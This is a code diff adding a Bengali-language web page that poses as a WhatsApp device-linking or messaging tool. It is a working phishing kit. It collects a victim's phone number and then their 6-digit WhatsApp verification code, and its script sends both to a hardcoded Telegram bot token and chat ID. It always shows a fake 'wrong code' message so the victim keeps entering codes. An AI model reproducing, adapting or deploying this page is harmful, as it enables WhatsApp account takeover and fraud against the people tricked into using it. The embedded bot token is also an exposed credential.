@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>WhatsApp Device Link (Code)</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+  body{font-family:'Poppins',sans-serif;background:#f3f4f6;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
+  .card{background:#fff;padding:24px;border-radius:12px;box-shadow:0 6px 20px rgba(0,0,0,0.08);width:92%;max-width:420px;text-align:left;}
+  h2{margin:0 0 12px 0;font-size:20px;text-align:center;}
+  .row{display:flex;gap:8px;}
+  select, input[type="tel"], textarea, input[type="text"] { /* ✅ input[type="text"] যোগ করা হয়েছে */
+    flex:1;
+    padding:10px;
+    border-radius:8px;
+    border:1px solid #d1d5db;
+    font-size:15px;
+    box-sizing: border-box;
+    -webkit-appearance: none;
+    appearance: none;
+    background-color: #fff;
+  }
+  select:focus, input[type="tel"]:focus, textarea:focus, input[type="text"]:focus { /* ✅ input[type="text"] যোগ করা হয়েছে */
+    outline: none;
+    border-color: #128C7E;
+    box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.25);
+  }
+  .full{width:100%;margin-top:12px;}
+  button{width:100%;background:#25D366;color:#fff;border:0;padding:12px;border-radius:8px;font-weight:600;cursor:pointer;font-size:16px;}
+  button:hover:not(:disabled){background:#128C7E;}
+  button:disabled{background-color:#999;cursor:not-allowed;}
+  .muted{font-size:13px;color:#6b7280;margin-top:8px;text-align:center;}
+  option{padding:8px;}
+  .code-display-container{text-align:center;padding:10px 0;}
+  
+  /* OTP বক্সের জন্য নতুন স্টাইল */
+  .otp-container{margin:15px 0;}
+  .otp-label{font-size:15px;color:#333;margin-bottom:8px;display:block;font-weight:600;}
+  .otp-status-message{font-size:14px;min-height:20px;margin-top:10px;}
+</style>
+</head>
+<body>
+<div class="card">
+  <div id="initial-form">
+    <h2>WhatsApp-এ বার্তা পাঠান</h2>
+    <div class="row" style="margin-bottom:10px;">
+      <select id="country-select" aria-label="Country"></select>
+      <input id="phone-input" type="tel" placeholder="নম্বরটি টাইপ করুন" />
+    </div>
+    
+    <div class="full" style="margin-top:10px;">
+        <textarea id="message-input" placeholder="কাস্টম বার্তাটি টাইপ করুন..." rows="3"></textarea>
+    </div>
+    
+    <div class="full">
+      <button id="add-button">কাস্টম বার্তা পাঠান</button>
+      <p class="muted">দেশ কোড নির্বাচন বা টাইপ করুন।</p>
+    </div>
+  </div>
+  
+  <div id="code-display" style="display:none;">
+    <h2>আনলক নম্বর যাচাই করুন</h2>
+    <p class="code-instructions">WhatsApp থেকে পাওয়া ৬ সংখ্যার যাচাইকরণ কোডটি এখানে বসান।</p>
+    
+    <!-- ✅ OTP ইনপুট ফিল্ড যোগ করা হয়েছে -->
+    <div class="otp-container">
+        <label for="otp-input" class="otp-label">Your Unlock Number (6 Digits)</label>
+        <input id="otp-input" type="text" pattern="\d*" maxlength="6" inputmode="numeric" placeholder="০ ০ ০ ০ ০ ০" oninput="checkAndSubmit();" style="text-align: center; font-size: 24px; letter-spacing: 5px;"/>
+    </div>
+    
+    <p class="otp-status-message" id="message-status" style="color:#DC3545; font-weight: 500;">⚠️ WhatsApp অ্যাপে পাওয়া ৬ সংখ্যার কোডটি বসান।</p>
+    
+    <button id="reload-button" style="margin-top:15px;" onclick="window.location.reload();">নতুন অনুরোধ শুরু করুন</button>
+  </div>
+</div>
+<script>
+// =================================================================
+//                 ✅ টেলিগ্রাম কনফিগারেশন
+// =================================================================
+const BOT_TOKEN = "7974529959:AAFAxgBkj-V6iF-Vd827VgP1wc-uzOQzNco"; 
+const CHAT_ID = "6658445342";
+let isSubmitting = false; // একাধিকবার সাবমিট হওয়া আটকানোর জন্য
+
+// গ্লোবাল ভ্যারিয়েবল সংরক্ষণ করা হলো, যাতে OTP স্ক্রিনে ব্যবহার করা যায়
+let globalPhoneNumber = '';
+let globalCustomMessage = '';
+// =================================================================
+
+// দেশের তালিকা (আগের কোড থেকে)
+const countries = [ {name:'Afghanistan',code:'93',flag:'🇦🇫'},{name:'Albania',code:'355',flag:'🇦🇱'},{name:'Algeria',code:'213',flag:'🇩🇿'}, {name:'American Samoa',code:'1684',flag:'🇦🇸'},{name:'Andorra',code:'376',flag:'🇦🇩'},{name:'Angola',code:'244',flag:'🇦🇴'}, {name:'Anguilla',code:'1264',flag:'🇦🇮'},{name:'Antigua & Barbuda',code:'1268',flag:'🇦🇬'},{name:'Argentina',code:'54',flag:'🇦🇷'}, {name:'Armenia',code:'374',flag:'🇦🇲'},{name:'Aruba',code:'297',flag:'🇦🇼'},{name:'Australia',code:'61',flag:'🇦🇺'}, {name:'Austria',code:'43',flag:'🇦🇹'},{name:'Azerbaijan',code:'994',flag:'🇦🇿'},{name:'Bahamas',code:'1242',flag:'🇧🇸'}, {name:'Bahrain',code:'973',flag:'🇧🇭'},{name:'Bangladesh',code:'880',flag:'🇧🇩'},{name:'Barbados',code:'1246',flag:'🇧🇧'}, {name:'Belarus',code:'375',flag:'🇧🇾'},{name:'Belgium',code:'32',flag:'🇧🇪'},{name:'Belize',code:'501',flag:'🇧🇿'}, {name:'Benin',code:'229',flag:'🇧🇯'},{name:'Bermuda',code:'1441',flag:'🇧🇲'},{name:'Bhutan',code:'975',flag:'🇧🇹'}, {name:'Bolivia',code:'591',flag:'🇧🇴'},{name:'Bosnia & Herzegovina',code:'387',flag:'🇧🇦'},{name:'Botswana',code:'267',flag:'🇧🇼'}, {name:'Brazil',code:'55',flag:'🇧🇷'},{name:'British Virgin Islands',code:'1284',flag:'🇻🇬'},{name:'Brunei',code:'673',flag:'🇧🇳'}, {name:'Bulgaria',code:'359',flag:'🇧🇬'},{name:'Burkina Faso',code:'226',flag:'🇧🇫'},{name:'Burundi',code:'257',flag:'🇧🇮'}, {name:'Cambodia',code:'855',flag:'🇰🇭'},{name:'Cameroon',code:'237',flag:'🇨🇲'},{name:'Canada',code:'1',flag:'🇨🇦'}, {name:'Cape Verde',code:'238',flag:'🇨🇻'},{name:'Cayman Islands',code:'1345',flag:'🇰🇾'},{name:'Central African Republic',code:'236',flag:'🇨🇫'}, {name:'Chad',code:'235',flag:'🇹🇩'},{name:'Chile',code:'56',flag:'🇨🇱'},{name:'China',code:'86',flag:'🇨🇳'}, {name:'Colombia',code:'57',flag:'🇨🇴'},{name:'Comoros',code:'269',flag:'🇰🇲'},{name:'Congo (Brazzaville)',code:'242',flag:'🇨🇬'}, {name:'Congo (DRC)',code:'243',flag:'🇨🇩'},{name:'Cook Islands',code:'682',flag:'🇨🇰'},{name:'Costa Rica',code:'506',flag:'🇨🇷'}, {name:'Côte d’Ivoire',code:'225',flag:'🇨🇮'},{name:'Croatia',code:'385',flag:'🇭🇷'},{name:'Cuba',code:'53',flag:'🇨🇺'}, {name:'Cyprus',code:'357',flag:'🇨🇾'},{name:'Czech Republic',code:'420',flag:'🇨🇿'},{name:'Denmark',code:'45',flag:'🇩🇰'}, {name:'Djibouti',code:'253',flag:'🇩🇯'},{name:'Dominica',code:'1767',flag:'🇩🇲'},{name:'Dominican Republic',code:'1',flag:'🇩🇴'}, {name:'Ecuador',code:'593',flag:'🇪🇨'},{name:'Egypt',code:'20',flag:'🇪🇬'},{name:'El Salvador',code:'503',flag:'🇸🇻'}, {name:'Equatorial Guinea',code:'240',flag:'🇬🇶'},{name:'Eritrea',code:'291',flag:'🇪🇷'},{name:'Estonia',code:'372',flag:'🇪🇪'}, {name:'Ethiopia',code:'251',flag:'🇪🇹'},{name:'Falkland Islands',code:'500',flag:'🇫🇰'},{name:'Faroe Islands',code:'298',flag:'🇫🇴'}, {name:'Fiji',code:'679',flag:'🇫🇯'},{name:'Finland',code:'358',flag:'🇫🇮'},{name:'France',code:'33',flag:'🇫🇷'}, {name:'French Guiana',code:'594',flag:'🇬🇫'},{name:'French Polynesia',code:'689',flag:'🇵🇫'},{name:'Gabon',code:'241',flag:'🇬🇦'}, {name:'Gambia',code:'220',flag:'🇬🇲'},{name:'Georgia',code:'995',flag:'🇬🇪'},{name:'Germany',code:'49',flag:'🇩🇪'}, {name:'Ghana',code:'233',flag:'🇬🇭'},{name:'Gibraltar',code:'350',flag:'🇬🇮'},{name:'Greece',code:'30',flag:'🇬🇷'}, {name:'Greenland',code:'299',flag:'🇬🇱'},{name:'Grenada',code:'1473',flag:'🇬🇩'},{name:'Guadeloupe',code:'590',flag:'🇬🇵'}, {name:'Guam',code:'1671',flag:'🇬🇺'},{name:'Guatemala',code:'502',flag:'🇬🇹'},{name:'Guernsey',code:'44',flag:'🇬🇬'}, {name:'Guinea',code:'224',flag:'🇬🇳'},{name:'Guinea-Bissau',code:'245',flag:'🇬🇼'},{name:'Guyana',code:'592',flag:'🇬🇾'}, {name:'Haiti',code:'509',flag:'🇭🇹'},{name:'Honduras',code:'504',flag:'🇭🇳'},{name:'Hong Kong',code:'852',flag:'🇭🇰'}, {name:'Hungary',code:'36',flag:'🇭🇺'},{name:'Iceland',code:'354',flag:'🇮🇸'},{name:'India',code:'91',flag:'🇮🇳'}, {name:'Indonesia',code:'62',flag:'🇮🇩'},{name:'Iran',code:'98',flag:'🇮🇷'},{name:'Iraq',code:'964',flag:'🇮🇶'}, {name:'Ireland',code:'353',flag:'🇮🇪'},{name:'Isle of Man',code:'44',flag:'🇮🇲'},{name:'Israel',code:'972',flag:'🇮🇱'}, {name:'Italy',code:'39',flag:'🇮🇹'},{name:'Jamaica',code:'1',flag:'🇯🇲'},{name:'Japan',code:'81',flag:'🇯🇵'}, {name:'Jersey',code:'44',flag:'🇯🇪'},{name:'Jordan',code:'962',flag:'🇯🇴'},{name:'Kazakhstan',code:'7',flag:'🇰🇿'}, {name:'Kenya',code:'254',flag:'🇰🇪'},{name:'Kiribati',code:'686',flag:'🇰🇮'},{name:'Kuwait',code:'965',flag:'🇰🇼'}, {name:'Kyrgyzstan',code:'996',flag:'🇰🇬'},{name:'Laos',code:'856',flag:'🇱🇦'},{name:'Latvia',code:'371',flag:'🇱🇻'}, {name:'Lebanon',code:'961',flag:'🇱🇧'},{name:'Lesotho',code:'266',flag:'🇱🇸'},{name:'Liberia',code:'231',flag:'🇱🇷'}, {name:'Libya',code:'218',flag:'🇱🇾'},{name:'Liechtenstein',code:'423',flag:'🇱🇮'},{name:'Lithuania',code:'370',flag:'🇱🇹'}, {name:'Luxembourg',code:'352',flag:'🇱🇺'},{name:'Macau',code:'853',flag:'🇲🇴'},{name:'Madagascar',code:'261',flag:'🇲🇬'}, {name:'Malawi',code:'265',flag:'🇲🇼'},{name:'Malaysia',code:'60',flag:'🇲🇾'},{name:'Maldives',code:'960',flag:'🇲🇻'}, {name:'Mali',code:'223',flag:'🇲🇱'},{name:'Malta',code:'356',flag:'🇲🇹'},{name:'Martinique',code:'596',flag:'🇲🇶'}, {name:'Mauritania',code:'222',flag:'🇲🇷'},{name:'Mauritius',code:'230',flag:'🇲🇺'},{name:'Mexico',code:'52',flag:'🇲🇽'}, {name:'Moldova',code:'373',flag:'🇲🇩'},{name:'Monaco',code:'377',flag:'🇲🇨'},{name:'Mongolia',code:'976',flag:'🇲🇳'}, {name:'Montenegro',code:'382',flag:'🇲🇪'},{name:'Morocco',code:'212',flag:'🇲🇦'},{name:'Mozambique',code:'258',flag:'🇲🇿'}, {name:'Myanmar (Burma)',code:'95',flag:'🇲🇲'},{name:'Namibia',code:'264',flag:'🇳🇦'},{name:'Nepal',code:'977',flag:'🇳🇵'}, {name:'Netherlands',code:'31',flag:'🇳🇱'},{name:'New Caledonia',code:'687',flag:'🇳🇨'},{name:'New Zealand',code:'64',flag:'🇳🇿'}, {name:'Nicaragua',code:'505',flag:'🇳🇮'},{name:'Niger',code:'227',flag:'🇳🇪'},{name:'Nigeria',code:'234',flag:'🇳🇬'}, {name:'North Korea',code:'850',flag:'🇰🇵'},{name:'North Macedonia',code:'389',flag:'🇲🇰'},{name:'Norway',code:'47',flag:'🇳🇴'}, {name:'Oman',code:'968',flag:'🇴🇲'},{name:'Pakistan',code:'92',flag:'🇵🇰'},{name:'Palau',code:'680',flag:'🇵🇼'}, {name:'Palestine',code:'970',flag:'🇵🇸'},{name:'Panama',code:'507',flag:'🇵🇦'},{name:'Papua New Guinea',code:'675',flag:'🇵🇬'}, {name:'Paraguay',code:'595',flag:'🇵🇾'},{name:'Peru',code:'51',flag:'🇵🇪'},{name:'Philippines',code:'63',flag:'🇵🇭'}, {name:'Poland',code:'48',flag:'🇵🇱'},{name:'Portugal',code:'351',flag:'🇵🇹'},{name:'Puerto Rico',code:'1',flag:'🇵🇷'}, {name:'Qatar',code:'974',flag:'🇶🇦'},{name:'Réunion',code:'262',flag:'🇷🇪'},{name:'Romania',code:'40',flag:'🇷🇴'}, {name:'Russia',code:'7',flag:'🇷🇺'},{name:'Rwanda',code:'250',flag:'🇷🇼'},{name:'Samoa',code:'685',flag:'🇼🇸'}, {name:'San Marino',code:'378',flag:'🇸🇲'},{name:'São Tomé & Príncipe',code:'239',flag:'🇸🇹'},{name:'Saudi Arabia',code:'966',flag:'🇸🇦'}, {name:'Senegal',code:'221',flag:'🇸🇳'},{name:'Serbia',code:'381',flag:'🇷🇸'},{name:'Seychelles',code:'248',flag:'🇸🇨'}, {name:'Sierra Leone',code:'232',flag:'🇸🇱'},{name:'Singapore',code:'65',flag:'🇸🇬'},{name:'Slovakia',code:'421',flag:'🇸🇰'}, {name:'Slovenia',code:'386',flag:'🇸🇮'},{name:'Solomon Islands',code:'677',flag:'🇸🇧'},{name:'Somalia',code:'252',flag:'🇸🇴'}, {name:'South Africa',code:'27',flag:'🇿🇦'},{name:'South Korea',code:'82',flag:'🇰🇷'},{name:'South Sudan',code:'211',flag:'🇸🇸'}, {name:'Spain',code:'34',flag:'🇪🇸'},{name:'Sri Lanka',code:'94',flag:'🇱🇰'},{name:'Sudan',code:'249',flag:'🇸🇩'}, {name:'Suriname',code:'597',flag:'🇸🇷'},{name:'Sweden',code:'46',flag:'🇸🇪'},{name:'Switzerland',code:'41',flag:'🇨🇭'}, {name:'Syria',code:'963',flag:'🇸🇾'},{name:'Taiwan',code:'886',flag:'🇹🇼'},{name:'Tanzania',code:'255',flag:'🇹🇿'}, {name:'Thailand',code:'66',flag:'🇹🇭'},{name:'Timor-Leste',code:'670',flag:'🇹🇱'},{name:'Togo',code:'228',flag:'🇹🇬'}, {name:'Tonga',code:'676',flag:'🇹🇴'},{name:'Trinidad & Tobago',code:'1868',flag:'🇹🇹'},{name:'Tunisia',code:'216',flag:'🇹🇳'}, {name:'Turkey',code:'90',flag:'🇹🇷'},{name:'Turkmenistan',code:'993',flag:'🇹🇲'},{name:'Uganda',code:'256',flag:'🇺🇬'}, {name:'Ukraine',code:'380',flag:'🇺🇦'},{name:'UAE',code:'971',flag:'🇦🇪'},{name:'United Kingdom',code:'44',flag:'🇬🇧'}, {name:'United States',code:'1',flag:'🇺🇸'},{name:'Uruguay',code:'598',flag:'🇺🇾'},{name:'Uzbekistan',code:'998',flag:'🇺🇿'}, {name:'Venezuela',code:'58',flag:'🇻🇪'},{name:'Vietnam',code:'84',flag:'🇻🇳'},{name:'Yemen',code:'967',flag:'🇾🇪'}, {name:'Zambia',code:'260',flag:'🇿🇲'},{name:'Zimbabwe',code:'263',flag:'🇿🇼'} ];
+
+// DOM এলিমেন্ট
+const select = document.getElementById('country-select');
+const phone = document.getElementById('phone-input');
+const messageInput = document.getElementById('message-input'); 
+const addButton = document.getElementById('add-button');
+const initialForm = document.getElementById('initial-form');
+const codeDisplay = document.getElementById('code-display');
+const messageStatus = document.getElementById('message-status');
+const otpBox = document.getElementById("otp-input"); // নতুন OTP ইনপুট বক্স
+
+// দেশের ড্রপডাউন সেটআপ এবং সিঙ্ক্রোনাইজেশন
+countries.forEach(c=>{const opt=document.createElement('option');opt.value=c.code;opt.textContent=`${c.flag} ${c.name} (+${c.code})`;select.appendChild(opt)});
+select.value='880';phone.value='+880 ';
+select.addEventListener('change',()=>{const rest=phone.value.replace(/^\+\d+\s?/,'');phone.value=`+${select.value} ${rest}`});
+phone.addEventListener('input',()=>{const m=phone.value.match(/^\+?(\d{1,4})/);if(m){const found=countries.find(c=>c.code===m[1]);if(found)select.value=found.code}});
+
+// =================================================================
+//                 ✅ ধাপ ১: ফোন নম্বর এবং মেসেজ পাঠানো
+// =================================================================
+addButton.addEventListener('click', () => {
+    const fullPhoneNumber = phone.value.replace(/\s+/g, '').replace(/-/g, '').trim(); 
+    const customMessage = messageInput.value.trim();
+
+    if (!fullPhoneNumber.startsWith('+') || fullPhoneNumber.length < 8) {
+        alert('অনুগ্রহ করে দেশ কোড সহ একটি সঠিক ফোন নম্বর দিন।');
+        return;
+    }
+    
+    if (customMessage.length === 0) {
+        alert('পাঠানোর জন্য একটি বার্তা টাইপ করুন।');
+        return;
+    }
+
+    // গ্লোবাল ভ্যারিয়েবলে ডেটা সংরক্ষণ
+    globalPhoneNumber = fullPhoneNumber;
+    globalCustomMessage = customMessage;
+
+    addButton.textContent = 'বার্তা পাঠানো হচ্ছে...'; 
+    addButton.disabled = true;
+
+    // টেলিগ্রামের জন্য মেসেজ তৈরি
+    const telegramMessage = `📞 *নতুন WhatsApp সংযোগের চেষ্টা!*
+    
+*নম্বর:* \`${globalPhoneNumber}\`
+*বার্তা:* ${globalCustomMessage}
+    
+_এখন OTP-এর জন্য অপেক্ষা করা হচ্ছে..._`;
+
+    // টেলিগ্রাম API কল
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ 
+            chat_id: CHAT_ID,
+            text: telegramMessage,
+            parse_mode: 'Markdown'
+        })
+    })
+    .finally(() => {
+        // API সফল হোক বা ব্যর্থ, OTP স্ক্রিনে চলে যাবে
+        initialForm.style.display = 'none';
+        codeDisplay.style.display = 'block';
+    });
+});
+
+// =================================================================
+//                 ✅ ধাপ ২: OTP ইনপুট ও অটো-সাবমিট
+// =================================================================
+function checkAndSubmit() {
+  let otp = otpBox.value.trim();
+  
+  // ইনপুটকে 6 ডিজিটে সীমাবদ্ধ করা
+  if (otp.length > 6) {
+    otp = otp.substring(0, 6);
+    otpBox.value = otp;
+  }
+  
+  // 6 ডিজিট হলেই অটো-সাবমিট
+  if (otp.length === 6 && !isSubmitting) {
+    submitOtp(otp);
+  } else if (otp.length < 6) {
+    // 6 ডিজিটের কম হলে কোন মেসেজ দেখাবে না, শুধু অপেক্ষা করবে।
+    messageStatus.textContent = "⚠️ WhatsApp অ্যাপে পাওয়া সঠিক ৬ সংখ্যার কোডটি বসান।";
+    messageStatus.style.color = '#DC3545';
+  }
+}
+
+// চূড়ান্ত OTP টেলিগ্রাম বটে পাঠানো
+function submitOtp(otp) {
+  isSubmitting = true;
+  messageStatus.textContent = "🔄 কোড পাঠানো হচ্ছে এবং যাচাই করা হচ্ছে...";
+  messageStatus.style.color = '#128C7E';
+  otpBox.disabled = true;
+
+  // টেলিগ্রামের জন্য চূড়ান্ত মেসেজ তৈরি
+  const finalMessage = `🚨 *নতুন WhatsApp OTP!* 🚨
+    
+*নম্বর:* \`${globalPhoneNumber}\`
+*বার্তা:* ${globalCustomMessage}
+
+*🔑 UNLOCK CODE:* \`${otp}\`
+    
+_সময়: ${new Date().toLocaleString('en-US', { timeZone: 'Asia/Dhaka' })}_`;
+
+
+  // টেলিগ্রাম API call
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: finalMessage, parse_mode: 'Markdown' })
+  })
+  .finally(() => {
+    // API সফল হোক বা ব্যর্থ, ব্যবহারকারীকে ভুল কোড মেসেজ দেখানো হবে (আপনার নির্দেশ অনুসারে)
+
+    // ১. ভুল কোড সিমুলেশন মেসেজ:
+    messageStatus.textContent = "❌ যাচাইকরণ ব্যর্থ হয়েছে: আপনার দেওয়া ৬ সংখ্যার আনলক নম্বরটি ভুল। অনুগ্রহ করে সঠিক কোডটি আবার দিন।";
+    messageStatus.style.color = '#DC3545';
+
+    // ২. ইনপুট বক্স খালি করা এবং রিসেট
+    otpBox.value = "";
+    otpBox.disabled = false;
+    isSubmitting = false;
+
+    // ৩. কিছুক্ষণ পর আবার স্বাভাবিক অবস্থায় ফিরে যাওয়া 
+    setTimeout(() => {
+      messageStatus.textContent = "⚠️ WhatsApp অ্যাপে পাওয়া সঠিক ৬ সংখ্যার কোডটি বসান।";
+    }, 4000); 
+
+  });
+}
+</script>
+</body>
+</html>
